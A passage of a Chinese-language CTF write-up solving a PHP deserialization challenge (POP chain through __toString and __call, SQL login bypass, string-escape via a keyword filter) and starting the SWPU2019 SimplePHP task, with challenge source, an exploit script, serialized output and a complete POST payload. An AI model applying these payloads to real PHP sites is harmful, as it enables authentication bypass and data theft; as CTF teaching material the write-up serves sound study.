class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>login</code>函数中调用<code>dbCtrl</code>类中的<code>login</code>函数执行SQL语句，<code>update</code>函数中有一个反序列化的地方，参数是<code>getNewInfo</code>函数的返回值。</p><p><code>getNewInfo</code>函数中<code>age</code>和<code>nickname</code>参数是可控的，传给了<code>Info</code>类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还要经过一次<code>safe</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换之后改变了数据的结构，类似0CTF2016 piapiapia这道题，很可能会引发字符逃逸的漏洞。</p><p>接着看<code>dbCtrl</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以知道的信息:</p><ol><li>用户名存在，且$this-&gt;password的md5的值与数据库查询用户密码相同。</li><li>或者token的值为admin</li></ol><p>这里有点像2019GXYCTF中的babySqli，是不是我们控制了sql语句，使用</p><ul><li><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></li><li>$this-&gt;password=1(1的md5的值为c4ca4238a0b923820dcc509a6f75849b)</li></ul><p>就可以通过登录密码的验证。</p><p>接下来构造POP链，先来找一下<code>__destruct</code>魔法方法，在<code>UpdateHelper</code>类中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现会把sql给echo出来，如果<code>$sql=new User()</code>的话，就会触发User内的__toString()魔术方法，该魔术方法内调用了<code>$nickname</code>属性的update()方法。虽然dbCtrl对象拥有update()方法，但是<code>$nickname</code>实例化成对象没意义。接着看<code>Info</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时我们看到了Info类内有<code>__call()</code>魔术方法，如果调用了一个不存在的属性，<code>__call()</code>方法就会触发，正好Info类没有update()方法，那么如果User内的<code>$nickname</code>实例化为Info对象，调用不存在update()就会触发这个<code>__call()</code>，这个<code>__call()</code>魔术方法将Ctrlcase的login()函数结果输出出来。</p><p>这样我们只需要<code>$CtrlCase</code>变量实例化为dbCtrl类的对象，这句话相当于相当于<code>dbCtrl::login($sql)</code>，而且可知<code>dbCtrl::login($sql)</code>中的<code>$sql</code>参数，实际上是User类中的$age变量传入的，参数就是我们控制的了。</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> $nickname = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $sql;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $name = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> $password = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure><p>序列化的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造好了POP链，接下来就是要找到触发反序列化的点。</p><p>从update.php 可以跟进User类的update()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>getNewInfo()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的返回值是一个先序列化在经过safe()函数处理的Info类对象。</p><p>所以最终能够反序列化的不是我们直接传入的字符串，而是用我们的值实例化一个Info类的对象，然后对这个对象进行实例化，再对这个序列化结果进行safe()处理，最后得到的值再进行反序列化。</p><p>所以想要发序列化我们的payload，就得控制 Info类对象的序列化串，看一下这个序列化串的格式</p><p>（假设age=20；nickname=lethe）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>这里的原理有点类似注入，都是闭合，先看一下我们构造的payload如下，未逃逸字符串前:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们在已序列化串前面加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>&#125;</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>但是长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p><p>这时候就需要用到字符逃逸的原理了，我们在payload的前面加上263个<code>union</code>，在经过safe函数之后，<code>union</code>全部被替换成<code>hacker</code>，也就是相当于新增了263个字符，这样就导致跟在后面的长度为263个字符的payload成功逃逸。</p><p>而之所前面构造的时候在最后面加一个<code>&#125;</code>，是因为Info类的对象只有3个变量，<code>&#125;</code>前面已经有3个变量满足了序列化串的要求了，所以加一个<code>&#125;</code>来闭合整个序列化串。</p><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>在update.php内post提交<code>age=123&amp;nickname=</code>后面接上输出结果，就会得到admin密码的md5。</p><h2 id="SWPU2019-SimplePHP">SWPU2019 SimplePHP</h2><h3 id="考点-v12">考点</h3><ul><li>文件包含</li><li>Phar反序列化</li></ul><h3 id="解题-v12">解题</h3><p>查看文件页面有文件包含，可以读取源码：</p><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; 